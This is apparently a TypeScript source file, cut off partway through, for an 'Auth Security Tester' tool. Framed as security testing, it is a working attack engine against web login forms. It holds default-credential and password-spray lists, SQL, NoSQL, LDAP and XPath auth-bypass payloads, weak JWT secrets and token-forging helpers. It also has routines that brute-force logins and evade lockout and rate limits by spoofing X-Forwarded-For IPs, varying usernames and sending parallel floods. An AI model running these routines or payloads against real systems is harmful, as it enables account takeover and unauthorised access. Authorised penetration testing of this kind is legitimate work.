import * as http from "http";
import * as https from "https";
import { randomBytes, createHmac } from "crypto";

// ═══════════════════════════════════════════════════════════════════════════
// AUTH SECURITY TESTER  v8.2.1  —  Real-World Advanced Engine
// Modules: DefaultCreds · SQLi · NoSQL/LDAP/XPath · LockoutBypass ·
//          RateLimit · JWT · Session · UserEnum · PasswordSpray ·
//          MFABypass · ContentTypeSwitch
// ═══════════════════════════════════════════════════════════════════════════

export interface AuthTesterConfig {
  target: string;
  port: number;
  loginPath: string;
  usernameField: string;
  passwordField: string;
  technique: string;
  customUsers?: string[];
  customPasswords?: string[];
}

export interface AuthTestResult {
  technique: string;
  username: string;
  password: string;
  status: "bypassed" | "found" | "failed" | "error" | "lockout_bypass" | "info"
    | "jwt_vuln" | "session_vuln" | "enum_found" | "spray_hit" | "mfa_bypass"
    | "nosql_bypass" | "timing_vuln";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  curlCommand?: string;
  timestamp: number;
}

export interface AuthTesterJob {
  id: string;
  config: AuthTesterConfig;
  startTime: number;
  active: boolean;
  results: AuthTestResult[];
  summary: {
    bypassed: number;
    found: number;
    tested: number;
    lockoutDetected: boolean;
    jwtVulns: number;
    sessionVulns: number;
    enumFound: boolean;
    riskScore: number;
  };
  trafficLog: string[];
}

const jobs = new Map<string, AuthTesterJob>();
function makeId() { return randomBytes(8).toString("hex"); }

// ─── Module 1: Default Credentials ────────────────────────────────────────
const DEFAULT_CREDENTIALS = [
  // Generic defaults
  { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "admin", p: "admin123" },
  { u: "admin", p: "123456" }, { u: "admin", p: "password123" }, { u: "admin", p: "" },
  { u: "admin", p: "1234" }, { u: "admin", p: "12345" }, { u: "admin", p: "qwerty" },
  { u: "admin", p: "letmein" }, { u: "admin", p: "welcome" }, { u: "admin", p: "changeme" },
  { u: "admin", p: "secret" }, { u: "admin", p: "Pa$$w0rd" }, { u: "admin", p: "P@ssw0rd" },
  { u: "admin", p: "Admin123!" }, { u: "admin", p: "admin@123" }, { u: "admin", p: "admin1234" },
  { u: "admin", p: "1q2w3e4r" }, { u: "admin", p: "abc123" }, { u: "admin", p: "pass" },
  { u: "administrator", p: "administrator" }, { u: "administrator", p: "admin" },
  { u: "administrator", p: "password" }, { u: "administrator", p: "123456" },
  { u: "root", p: "root" }, { u: "root", p: "toor" }, { u: "root", p: "" },
  { u: "root", p: "password" }, { u: "root", p: "admin" }, { u: "root", p: "root123" },
  { u: "test", p: "test" }, { u: "test", p: "test123" }, { u: "test", p: "password" },
  { u: "guest", p: "guest" }, { u: "guest", p: "" }, { u: "guest", p: "guest123" },
  { u: "user", p: "user" }, { u: "user", p: "password" }, { u: "user", p: "user123" },
  { u: "superadmin", p: "superadmin" }, { u: "superuser", p: "superuser" },
  { u: "sa", p: "sa" }, { u: "sa", p: "" }, { u: "sysadmin", p: "sysadmin" },
  { u: "webmaster", p: "webmaster" }, { u: "demo", p: "demo" }, { u: "operator", p: "operator" },
  { u: "manager", p: "manager" }, { u: "support", p: "support" },
  { u: "oracle", p: "oracle" }, { u: "postgres", p: "postgres" }, { u: "mysql", p: "mysql" },
  // Vendor: Cisco
  { u: "cisco", p: "cisco" }, { u: "admin", p: "cisco123" }, { u: "enable", p: "cisco" },
  // Vendor: Juniper
  { u: "netscreen", p: "netscreen" }, { u: "root", p: "juniper" },
  // Vendor: Fortinet
  { u: "admin", p: "fortigate" }, { u: "admin", p: "fortinet" },
  // Vendor: F5 BIG-IP
  { u: "root", p: "default" }, { u: "admin", p: "admin" },
  // Vendor: Palo Alto
  { u: "admin", p: "Paloalto1!" },
  // Vendor: Ubiquiti
  { u: "ubnt", p: "ubnt" }, { u: "admin", p: "ubnt" },
  // Vendor: MikroTik
  { u: "admin", p: "mikrotik" },
  // Vendor: VMware
  { u: "root", p: "vmware" }, { u: "admin", p: "vmware" },
  // Service: Jenkins
  { u: "admin", p: "jenkins" }, { u: "jenkins", p: "jenkins" },
  // Service: GitLab
  { u: "root", p: "5iveL!fe" }, { u: "root", p: "password" },
  // Service: Grafana
  { u: "admin", p: "grafana" },
  // Service: Elasticsearch/Kibana
  { u: "elastic", p: "elastic" }, { u: "elastic", p: "changeme" }, { u: "kibana", p: "kibana" },
  // Service: Splunk
  { u: "admin", p: "changeme" }, { u: "splunk", p: "splunk" },
  // Service: Tomcat
  { u: "tomcat", p: "tomcat" }, { u: "manager", p: "tomcat" }, { u: "admin", p: "s3cret" },
  { u: "role1", p: "tomcat" }, { u: "both", p: "tomcat" },
  // Service: Nagios
  { u: "nagiosadmin", p: "nagiosadmin" }, { u: "nagios", p: "nagios" },
  // Service: Zabbix
  { u: "Admin", p: "zabbix" }, { u: "guest", p: "" },
  // Service: phpMyAdmin
  { u: "root", p: "" }, { u: "pma", p: "pma" },
  // Top breach passwords
  { u: "admin", p: "dragon" }, { u: "admin", p: "master" }, { u: "admin", p: "monkey" },
  { u: "admin", p: "sunshine" }, { u: "admin", p: "princess" }, { u: "admin", p: "shadow" },
  { u: "admin", p: "superman" }, { u: "admin", p: "batman" }, { u: "admin", p: "trustno1" },
  { u: "admin", p: "login" }, { u: "admin", p: "iloveyou" }, { u: "admin", p: "football" },
  // Keyboard walks
  { u: "admin", p: "1q2w3e" }, { u: "admin", p: "qazwsx" }, { u: "admin", p: "q1w2e3r4" },
  { u: "admin", p: "zxcvbnm" }, { u: "admin", p: "asdfghjkl" },
];

// ─── Module 2: SQL Injection Payloads (48+) ───────────────────────────────
const SQLI_PAYLOADS = [
  { u: "' OR '1'='1", p: "' OR '1'='1" },
  { u: "' OR 1=1--", p: "x" }, { u: "' OR 1=1#", p: "x" }, { u: "' OR 1=1/*", p: "x" },
  { u: "' OR 'x'='x", p: "' OR 'x'='x" },
  { u: "admin'--", p: "anything" }, { u: "admin' #", p: "anything" }, { u: "admin'/*", p: "anything" },
  { u: "admin' OR '1'='1'--", p: "any" }, { u: "admin' OR '1'='1'#", p: "any" },
  { u: "\" OR \"\"=\"", p: "\" OR \"\"=\"" }, { u: "admin\"--", p: "anything" },
  { u: "') OR ('1'='1", p: "') OR ('1'='1" }, { u: "' OR ('1'='1')", p: "' OR ('1'='1')" },
  { u: "' UNION SELECT 1,1--", p: "x" }, { u: "' UNION SELECT null,null--", p: "x" },
  { u: "' UNION ALL SELECT 1--", p: "x" }, { u: "' UNION SELECT 1,1,1--", p: "x" },
  { u: "admin' AND SLEEP(2)--", p: "x" }, { u: "admin' AND 1=1 AND SLEEP(2)--", p: "x" },
  { u: "'; WAITFOR DELAY '0:0:2'--", p: "x" }, { u: "admin'; WAITFOR DELAY '0:0:2'--", p: "x" },
  { u: "admin' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--", p: "x" },
  { u: "'; EXEC xp_cmdshell('ping 127.0.0.1')--", p: "x" },
  { u: "%27%20OR%20%271%27%3D%271", p: "x" }, { u: "' OR 0x313d31--", p: "x" },
  { u: "admin'-- -", p: "any" }, { u: "admin' /*comment*/--", p: "any" },
  { u: "admin' AND '1'='1", p: "admin" }, { u: "admin' AND 1=1--", p: "any" },
  { u: "'; SELECT pg_sleep(2)--", p: "x" }, { u: "' OR '1'='1' FROM DUAL--", p: "x" },
  { u: "' OR 1=1 LIMIT 1--", p: "x" }, { u: "' OR ''='", p: "' OR ''='" },
  { u: "admin\\' OR 1=1--", p: "x" }, { u: "' OR ''='' --", p: "x" },
  { u: "' OR 2=2--", p: "x" }, { u: "' OR 'a'='a", p: "x" },
  { u: "admin' OR 'unusual'='unusual", p: "any" }, { u: "' OR 3=3--", p: "x" },
  { u: "a' OR 'a'='a", p: "x" }, { u: "1' OR '1'='1'--", p: "x" },
  { u: "1 OR 1=1", p: "1 OR 1=1" }, { u: "' OR 1 --", p: "x" },
];

// ─── Module 3: NoSQL Injection ────────────────────────────────────────────
const NOSQL_PAYLOADS = [
  { desc: "$ne null", body: (u: string, p: string) => JSON.stringify({ [u]: { "$ne": null }, [p]: { "$ne": null } }) },
  { desc: "$gt empty string", body: (u: string, p: string) => JSON.stringify({ [u]: { "$gt": "" }, [p]: { "$gt": "" } }) },
  { desc: "$regex .*", body: (u: string, p: string) => JSON.stringify({ [u]: { "$regex": ".*" }, [p]: { "$regex": ".*" } }) },
  { desc: "admin + $ne", body: (u: string, p: string) => JSON.stringify({ [u]: "admin", [p]: { "$ne": "" } }) },
  { desc: "$where 1==1", body: (u: string, p: string) => JSON.stringify({ [u]: "admin", "$where": "1==1" }) },
  { desc: "$exists true", body: (u: string, p: string) => JSON.stringify({ [u]: "admin", [p]: { "$exists": true } }) },
  { desc: "$nin empty", body: (u: string, p: string) => JSON.stringify({ [u]: { "$nin": [""] }, [p]: { "$nin": [""] } }) },
  { desc: "array injection", body: (u: string, p: string) => `${u}[]=admin&${p}[]=anything` },
  { desc: "$type string", body: (u: string, p: string) => JSON.stringify({ [u]: "admin", [p]: { "$type": 2 } }) },
  { desc: "admin + $gt", body: (u: string, p: string) => JSON.stringify({ [u]: "admin", [p]: { "$gt": "" } }) },
];

// ─── Module 4: LDAP Injection ─────────────────────────────────────────────
const LDAP_PAYLOADS = [
  { u: "*", p: "*", desc: "LDAP wildcard" },
  { u: "*)(uid=*))(|(uid=*", p: "*", desc: "LDAP OR bypass" },
  { u: "admin)(&)", p: "*", desc: "LDAP AND short-circuit" },
  { u: "admin)(password=*", p: "*", desc: "LDAP attribute probe" },
  { u: "*)(|(password=*", p: "anything", desc: "LDAP password wildcard" },
  { u: "admin)(%00", p: "x", desc: "LDAP null byte" },
  { u: "*()|%26'", p: "x", desc: "LDAP metachar" },
];

// ─── Module 5: XPath Injection ────────────────────────────────────────────
const XPATH_PAYLOADS = [
  { u: "' or '1'='1", p: "' or '1'='1", desc: "XPath OR bypass" },
  { u: "admin' or '1'='1", p: "x", desc: "XPath admin OR" },
  { u: "\" or \"1\"=\"1", p: "\" or \"1\"=\"1", desc: "XPath double-quote" },
  { u: "' or position()=1 or '", p: "x", desc: "XPath position" },
];

// ─── IP Rotation Pool ─────────────────────────────────────────────────────
const ROTATION_IPS = [
  "127.0.0.1", "10.0.0.1", "10.0.0.2", "192.168.1.1", "192.168.0.1",
  "172.16.0.1", "::1", "0.0.0.0",
  ...Array.from({ length: 50 }, (_, i) => `203.${Math.floor(i / 10)}.${i % 10}.${i + 1}`),
  ...Array.from({ length: 40 }, (_, i) => `185.${i + 1}.100.${i + 50}`),
];

// ─── Password Spray List ──────────────────────────────────────────────────
const SPRAY_PASSWORDS = [
  "Password1!", "Welcome1!", "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
  "Company123!", "Admin123!", "123456789", "qwerty123", "abc123456", "pass@123",
  "P@ssword1", "Passw0rd!", "Test1234!", "Hello@123", "Qwerty@123", "Admin@2024",
  "Password@1", "Welcome@1", "monkey123", "dragon123", "trustno1!", "letmein1!",
  "changeme1", "default1!", "batman123", "superman1",
];

// ─── JWT Weak Secrets ─────────────────────────────────────────────────────
const JWT_SECRETS = [
  "secret", "password", "key", "jwt", "token", "abc123", "123456", "qwerty",
  "changeme", "supersecret", "yoursecret", "jwtkey", "secretkey", "accesstoken",
  "privatekey", "mysecret", "jwtsecret", "jwt-secret", "jwt_secret", "app_secret",
  "laravel_secret", "django_secret", "rails_secret", "node_secret", "express_secret",
  "app", "application", "secret123", "password123", "default", "test", "dev",
  "development", "production", "auth", "authorization", "bearer", "api", "apikey",
  "api_key", "SECRET_KEY", "APP_KEY", "", "null", "admin", "root", "123456789",
];

// ─── Common MFA OTPs ──────────────────────────────────────────────────────
const COMMON_OTPS = [
  "000000", "111111", "123456", "654321", "999999", "112233", "121212",
  "000001", "222222", "333333", "444444", "555555", "102030", "010101",
];

// ─── Utilities ────────────────────────────────────────────────────────────
function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 3000) log.splice(0, log.length - 3000); }
function delay(ms: number) { return new Promise<void>(r => setTimeout(r, ms)); }

function doRequest(opts: {
  hostname: string; port: number; path: string; method: string;
  headers: Record<string, string>; body: string; isHttps?: boolean; timeout?: number;
}): Promise<{ code: number; body: string; headers: http.IncomingMessage["headers"]; rt: number }> {
  return new Promise((resolve) => {
    const start = Date.now();
    const mod = opts.isHttps ? https : http;
    const req = (mod.request as any)({
      hostname: opts.hostname, port: opts.port, path: opts.path,
      method: opts.method, headers: opts.headers,
      timeout: opts.timeout || 10000, rejectUnauthorized: false,
    }, (res: http.IncomingMessage) => {
      let data = "";
      res.on("data", (c: Buffer) => { if (data.length < 50000) data += c.toString(); });
      res.on("end", () => resolve({ code: res.statusCode || 0, body: data, headers: res.headers, rt: Date.now() - start }));
      res.on("error", () => resolve({ code: 0, body: "", headers: {}, rt: Date.now() - start }));
    });
    req.on("error", () => resolve({ code: 0, body: "", headers: {}, rt: Date.now() - start }));
    req.on("timeout", () => { req.destroy(); resolve({ code: 0, body: "", headers: {}, rt: Date.now() - start }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

function buildFormRequest(config: AuthTesterConfig, user: string, pass: string, extraHeaders: Record<string, string> = {}) {
  const isHttps = config.port === 443 || config.target.startsWith("https://");
  const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
  const body = `${config.usernameField}=${encodeURIComponent(user)}&${config.passwordField}=${encodeURIComponent(pass)}`;
  return {
    hostname, port: config.port, path: config.loginPath, method: "POST", isHttps, body,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": String(Buffer.byteLength(body)),
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121",
      "Accept": "text/html,application/json,*/*",
      "Accept-Language": "en-US,en;q=0.9",
      ...extraHeaders,
    },
  };
}

function isBypass(code: number, body: string): boolean {
  if (!code || code === 400 || code >= 500) return false;
  if (code >= 200 && code < 400) {
    const lower = body.toLowerCase();
    const hit = ["dashboard", "welcome back", "logout", "sign out", "log out", "signed in",
      "profile", "my account", "account settings", "you are logged", "successfully logged",
      "access granted", "authenticated", "main menu", "home page"];
    const miss = ["invalid", "incorrect", "wrong password", "failed", "unauthorized",
      "bad credentials", "login failed", "authentication failed", "not authorized",
      "access denied", "error", "try again"];
    return hit.some(h => lower.includes(h)) && !miss.some(m => lower.includes(m));
  }
  return false;
}

function makeCurl(config: AuthTesterConfig, u: string, p: string, extra: Record<string, string> = {}, ct = "application/x-www-form-urlencoded", rawBody?: string): string {
  const proto = config.port === 443 ? "https" : "http";
  const host = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
  const hdrs = Object.entries(extra).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
  const bodyArg = rawBody
    ? `-d '${rawBody.slice(0, 120)}'`
    : `-d "${config.usernameField}=${encodeURIComponent(u)}&${config.passwordField}=${encodeURIComponent(p)}"`;
  return `curl -sk -X POST ${hdrs} -H "Content-Type: ${ct}" ${bodyArg} "${proto}://${host}:${config.port}${config.loginPath}"`.replace(/\s+/g, " ").trim();
}

// ─── JWT Utilities ────────────────────────────────────────────────────────
function decodeJwt(token: string): { header: any; payload: any } | null {
  try {
    const [h, p] = token.split(".");
    const dec = (s: string) => JSON.parse(Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString());
    return { header: dec(h), payload: dec(p) };
  } catch { return null; }
}
function forgeNoneJwt(payload: any): string {
  const h = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
  const b = Buffer.from(JSON.stringify(payload)).toString("base64url");
  return `${h}.${b}.`;
}
function forgeHmac(payload: any, secret: string): string {
  const h = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
  const b = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = createHmac("sha256", secret).update(`${h}.${b}`).digest("base64url");
  return `${h}.${b}.${sig}`;
}
function extractJwt(body: string, hdrs: http.IncomingMessage["headers"]): string | null {
  for (const c of ((hdrs["set-cookie"] || []) as string[])) {
    const m = c.match(/(?:token|jwt|auth|access_token|session)=([A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)/i);
    if (m) return m[1];
  }
  const bm = body.match(/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*/);
  return bm?.[0] || null;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN TEST ENGINE
// ═══════════════════════════════════════════════════════════════════════════
export function startAuthTest(config: AuthTesterConfig): AuthTesterJob {
  const id = makeId();
  const job: AuthTesterJob = {
    id, config, startTime: Date.now(), active: true,
    results: [],
    summary: { bypassed: 0, found: 0, tested: 0, lockoutDetected: false, jwtVulns: 0, sessionVulns: 0, enumFound: false, riskScore: 0 },
    trafficLog: [],
  };
  jobs.set(id, job);

  function add(r: Omit<AuthTestResult, "timestamp">) {
    const res: AuthTestResult = { ...r, timestamp: Date.now() };
    job.results.push(res);
    const w: Record<string, number> = {
      bypassed: 25, found: 20, nosql_bypass: 25, mfa_bypass: 30, lockout_bypass: 15,
      jwt_vuln: 20, session_vuln: 10, enum_found: 8, spray_hit: 15, timing_vuln: 8,
    };
    job.summary.riskScore = Math.min(100, job.summary.riskScore + (w[r.status] || 0));
    if (["bypassed", "found", "nosql_bypass", "mfa_bypass"].includes(r.status)) job.summary.bypassed++;
    if (["found", "spray_hit"].includes(r.status)) job.summary.found++;
    if (r.status === "jwt_vuln") job.summary.jwtVulns++;
    if (r.status === "session_vuln") job.summary.sessionVulns++;
    if (["enum_found", "timing_vuln"].includes(r.status)) job.summary.enumFound = true;
    job.summary.tested++;
  }

  const techniques = config.technique === "all"
    ? ["default-creds", "sqli-bypass", "nosql-inject", "ldap-xpath",
       "lockout-bypass", "rate-limit-check", "jwt-attack", "session-security",
       "user-enum", "password-spray", "mfa-bypass", "content-type-switch"]
    : [config.technique];

  const run = async () => {
    const ts = tsFmt;
    pushLog(job.trafficLog, [
      `[${ts()}] ╔══════════════════════════════════════════════════════╗`,
      `[${ts()}] ║   AegisAI360 Auth Security Tester  v8.2.1            ║`,
      `[${ts()}] ║   Target : ${config.target}:${config.port}${config.loginPath}`.slice(0, 55).padEnd(55) + "║",
      `[${ts()}] ║   Mode   : ${config.technique}`.slice(0, 55).padEnd(55) + "║",
      `[${ts()}] ╚══════════════════════════════════════════════════════╝`,
    ]);

    // Baseline response
    let baselineLen = 0;
    try {
      const br = await doRequest(buildFormRequest(config, "baseline_nonexistent_xyz123", "WRONG_PASS_xyz!@#99"));
      baselineLen = br.body.length;
      pushLog(job.trafficLog, [`[${ts()}] Baseline → HTTP ${br.code} len=${br.body.length}ms rt=${br.rt}`]);
    } catch { /* ok */ }

    // ── DEFAULT CREDENTIALS ────────────────────────────────────────────────
    if (techniques.includes("default-creds") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 1: Default Credentials (${DEFAULT_CREDENTIALS.length} pairs) ──`]);
      const allCreds = [
        ...DEFAULT_CREDENTIALS,
        ...(config.customUsers || []).flatMap(u =>
          (config.customPasswords?.length ? config.customPasswords : ["password", "admin", "123456", u])
            .map(p => ({ u, p }))
        ),
      ];
      for (const cred of allCreds) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, cred.u, cred.p));
        pushLog(job.trafficLog, [`[${ts()}] CRED "${cred.u}" → HTTP ${r.code} rt=${r.rt}ms`]);
        const ok = isBypass(r.code, r.body);
        add({
          technique: "default-creds", username: cred.u, password: cred.p,
          status: ok ? "found" : "failed", statusCode: r.code, responseTime: r.rt,
          evidence: ok ? `Default credential ${cred.u}:${cred.p} accepted — HTTP ${r.code}` : undefined,
          curlCommand: ok ? makeCurl(config, cred.u, cred.p) : undefined,
        });
        await delay(80);
      }
    }

    // ── SQL INJECTION ──────────────────────────────────────────────────────
    if (techniques.includes("sqli-bypass") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 2: SQL Injection (${SQLI_PAYLOADS.length} payloads) ──`]);
      let found = 0;
      for (const pl of SQLI_PAYLOADS) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, pl.u, pl.p));
        pushLog(job.trafficLog, [`[${ts()}] SQLI "${pl.u.slice(0, 40)}" → HTTP ${r.code} len=${r.body.length}`]);
        const ok = isBypass(r.code, r.body) || (r.code >= 200 && r.code < 400 && Math.abs(r.body.length - baselineLen) > 200);
        if (ok) {
          found++;
          add({
            technique: "sqli-bypass", username: pl.u, password: pl.p,
            status: "bypassed", statusCode: r.code, responseTime: r.rt,
            evidence: `SQL injection auth bypass: "${pl.u}" caused anomalous response — HTTP ${r.code} body length ${r.body.length} (baseline ${baselineLen})`,
            curlCommand: makeCurl(config, pl.u, pl.p),
          });
        }
        await delay(60);
      }
      add({
        technique: "sqli-bypass", username: "(probe summary)", password: `(${SQLI_PAYLOADS.length} payloads)`,
        status: "info",
        evidence: `Tested ${SQLI_PAYLOADS.length} SQLi payloads: UNION, time-based SLEEP/WAITFOR, error-based EXTRACTVALUE, boolean-blind, stacked queries, encoded, Oracle/MSSQL/PostgreSQL/SQLite — ${found} bypasses found`,
      });
    }

    // ── NOSQL / LDAP / XPATH INJECTION ────────────────────────────────────
    if (techniques.includes("nosql-inject") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 3: NoSQL/LDAP/XPath Injection ──`]);
      const isHttps = config.port === 443 || config.target.startsWith("https://");
      const hostname = config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0];

      for (const pl of NOSQL_PAYLOADS) {
        if (!job.active) break;
        const body = pl.body(config.usernameField, config.passwordField);
        const isJson = body.startsWith("{");
        const ct = isJson ? "application/json" : "application/x-www-form-urlencoded";
        const r = await doRequest({
          hostname, port: config.port, path: config.loginPath, method: "POST", isHttps, body,
          headers: { "Content-Type": ct, "Content-Length": String(Buffer.byteLength(body)), "User-Agent": "Mozilla/5.0 (AegisAI360)" },
        });
        pushLog(job.trafficLog, [`[${ts()}] NOSQL "${pl.desc}" → HTTP ${r.code} len=${r.body.length}`]);
        const ok = isBypass(r.code, r.body) || (r.code >= 200 && r.code < 400 && Math.abs(r.body.length - baselineLen) > 150);
        if (ok) {
          add({
            technique: "nosql-inject", username: pl.desc, password: body.slice(0, 80),
            status: "nosql_bypass", statusCode: r.code, responseTime: r.rt,
            evidence: `NoSQL injection bypass via ${pl.desc}: HTTP ${r.code} body ${r.body.length}B`,
            curlCommand: `curl -sk -X POST -H "Content-Type: ${ct}" -d '${body}' "${isHttps ? "https" : "http"}://${hostname}:${config.port}${config.loginPath}"`,
          });
        }
        await delay(80);
      }

      for (const pl of [...LDAP_PAYLOADS, ...XPATH_PAYLOADS]) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, pl.u, pl.p));
        const ok = isBypass(r.code, r.body);
        if (ok) {
          add({
            technique: techniques.includes("ldap-xpath") ? "ldap-xpath" : "nosql-inject",
            username: pl.u, password: pl.p,
            status: "bypassed", statusCode: r.code, responseTime: r.rt,
            evidence: `Injection bypass (${(pl as any).desc}): HTTP ${r.code}`,
            curlCommand: makeCurl(config, pl.u, pl.p),
          });
        }
        await delay(60);
      }

      add({
        technique: "nosql-inject", username: "(probe summary)", password: `(${NOSQL_PAYLOADS.length + LDAP_PAYLOADS.length + XPATH_PAYLOADS.length} probes)`,
        status: "info",
        evidence: `Tested MongoDB $ne/$gt/$regex/$where/$nin/$exists, LDAP wildcard/OR/AND/null-byte, XPath OR/position attacks`,
      });
    }

    // ── LOCKOUT BYPASS ─────────────────────────────────────────────────────
    if (techniques.includes("lockout-bypass") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 4: Lockout Bypass (trigger + IP rotation + username variants + parallel flood) ──`]);
      const testUser = "admin";
      const badPass = `WRONG_xyz_${randomBytes(4).toString("hex")}`;

      // Trigger lockout
      let lockoutCode = 0;
      for (let i = 0; i < 12 && job.active; i++) {
        const r = await doRequest(buildFormRequest(config, testUser, `${badPass}_${i}`));
        lockoutCode = r.code;
        pushLog(job.trafficLog, [`[${ts()}] Lockout trigger ${i + 1}/12 → HTTP ${r.code}`]);
        if (r.code === 429 || (r.code === 403 && i >= 5)) {
          job.summary.lockoutDetected = true;
          add({
            technique: "lockout-bypass", username: testUser, password: `(${i + 1} attempts)`,
            status: "info", statusCode: r.code,
            evidence: `Account lockout TRIGGERED at attempt ${i + 1} — HTTP ${r.code} (good protection)`,
          });
          break;
        }
        await delay(200);
      }
      if (!job.summary.lockoutDetected) {
        add({
          technique: "lockout-bypass", username: testUser, password: "(12 bad attempts)",
          status: "lockout_bypass", statusCode: lockoutCode,
          evidence: `NO lockout after 12 failed attempts — endpoint allows unlimited brute force`,
        });
      }

      // IP rotation bypass
      let rotationBypassed = false;
      const ipHeaders = ["X-Forwarded-For", "X-Real-IP", "True-Client-IP", "CF-Connecting-IP", "X-Client-IP"];
      for (let i = 0; i < ROTATION_IPS.length && job.active; i++) {
        const ip = ROTATION_IPS[i];
        const extra: Record<string, string> = {};
        ipHeaders.forEach(h => { extra[h] = ip; });
        const r = await doRequest(buildFormRequest(config, testUser, badPass, extra));
        pushLog(job.trafficLog, [`[${ts()}] IP rotation ${ip} → HTTP ${r.code}`]);
        if (r.code !== 429 && r.code !== 403 && job.summary.lockoutDetected) {
          rotationBypassed = true;
          add({
            technique: "lockout-bypass", username: testUser, password: `(X-Forwarded-For: ${ip})`,
            status: "lockout_bypass", statusCode: r.code,
            evidence: `Lockout BYPASSED via IP spoofing: X-Forwarded-For: ${ip} circumvented IP-based lockout`,
            curlCommand: `curl -sk -X POST -H "X-Forwarded-For: ${ip}" -d "${config.usernameField}=admin&${config.passwordField}=test" "${config.port === 443 ? "https" : "http"}://${config.target.replace(/^https?:\/\//, "").split(/[:/]/)[0]}:${config.port}${config.loginPath}"`,
          });
          break;
        }
        await delay(50);
      }
      if (!rotationBypassed && job.summary.lockoutDetected) {
        add({
          technique: "lockout-bypass", username: "(IP rotation)", password: `(${ROTATION_IPS.length} IPs)`,
          status: "info",
          evidence: `IP rotation tested with ${ROTATION_IPS.length} IPs via 5 different headers — lockout remained active (good)`,
        });
      }

      // Username normalization
      const variants = [
        testUser + " ", " " + testUser, testUser + "\t",
        testUser.toUpperCase(), testUser.charAt(0).toUpperCase() + testUser.slice(1),
        testUser + "@localdomain", testUser + "@example.com",
        testUser + "%00", testUser + ".", testUser + "·",
      ];
      for (const v of variants) {
        if (!job.active) break;
        const r = await doRequest(buildFormRequest(config, v, badPass));
        if (r.code !== 429 && r.code !== 403 && job.summary.lockoutDetected) {
          add({
            technique: "lockout-bypass", username: JSON.stringify(v), password: badPass,
            status: "lockout_bypass", statusCode: r.code,
            evidence: `Username normalization bypass: variant "${JSON.stringify(v)}" treated as different account`,
            curlCommand: makeCurl(config, v, badPass),
          });
        }
        await delay(50);
      }

      // Parallel flood (race condition)
      if (job.active) {
        const parallel = await Promise.all(
          Array.from({ length: 15 }, (_, i) => doRequest(buildFormRequest(config, testUser, `${badPass}_p${i}`)))
        );
        const codes = parallel.map(r => r.code);
        const anyPassed = codes.some(c => c !== 429 && c !== 403 && c >= 200 && c < 500);
        pushLog(job.trafficLog, [`[${ts()}] Parallel flood × 15 → codes [${[...new Set(codes)].join(",")}]`]);
        add({
          technique: "lockout-bypass", username: "(parallel × 15)", password: "(race condition)",
          status: anyPassed ? "lockout_bypass" : "info", statusCode: Math.max(...codes),
          evidence: anyPassed
            ? `Race condition bypass: parallel flood codes [${[...new Set(codes)].join(",")}] — some requests evaded lockout`
            : `Parallel flood survived — codes [${[...new Set(codes)].join(",")}] — no race condition bypass`,
        });
      }
    }

    // ── RATE LIMIT CHECK ──────────────────────────────────────────────────
    if (techniques.includes("rate-limit-check") && job.active) {
      pushLog(job.trafficLog, [`[${ts()}] ┌── MODULE 5: Rate Limit Evasion (burst + drip + agent rotation) ──`]);

      // Burst 40 requests
      const burstCodes: number[] = [];
      for (let i = 0; i < 40 && job.active; i++) {
        const r = await doRequest(buildFormRequest(config, "burstuser", "burstpass", {
          "User-Agent": `AegisAI360/${i}/${randomBytes(4).toString("hex")}`,
          "X-Forwarded-For": ROTATION_IPS[i % ROTATION_IPS.length],
        }));
        burstCodes.push(r.code);
        await delay(20);
      }
      const rateLimited = burstCodes.some(c => c === 429);
      add({
        technique: "rate-limit-check", username: "burstuser", password: "(40-req burst)",
        status: "info",
        evidence: rateLimited
          ? `Rate limiting ACTIVE (HTTP 429) — brute force protection working`
          : `NO rate limiting on 40-req burst — codes: [${[...new Set(burstCodes)].join(",")}] — endpoint vulnerable to high-speed attack`,
      });

      // Slow drip: 1 request per 2 seconds × 20 rounds
      let drip429 = false;
      for (let i = 0; i < 20 && job.active; i++) {
        const r = await doRequest(buildFormRequest(config, "dripuser", `wrongpass${i}`, { "X-Forwarded-For": ROTATION_IPS[i] }));
        if (r.code === 429) { drip429 = true; break; }
        await delay(2000);
      }
      add({
        technique: "rate-limit-check", username: "dripuser", password: "(slow drip × 20)",
        status: "info",
        evidence: drip429
          ? `Slow-drip rate limit triggered — server tracks attempt counts over time (good)`
          : `Slow-drip (1 req/2s × 20): no rate limiting — attacker can enumerate slowly without triggering lockout`,
      });

      // CAPTCHA probe
      if (job.active) {
        const r = await doRequest(buildFormRequest(config, "admin", "captchaprobe_xyz99"));
        const hasCaptcha = ["captcha", "recaptcha", "hcaptcha", "challenge", "bot"].some(s => r.body.toLowerCase().includes(s));
        add({
          technique: "rate-limit-check", username: "(CAPTCHA probe)", password: "-",
          status: "info",
          evidence: hasCaptcha
            ? `CAPTCHA/bot challenge detected in response — additional protection present`
            : `No CAPTCHA or bot-detection mechanism found in login response`,
        });
      }
    }

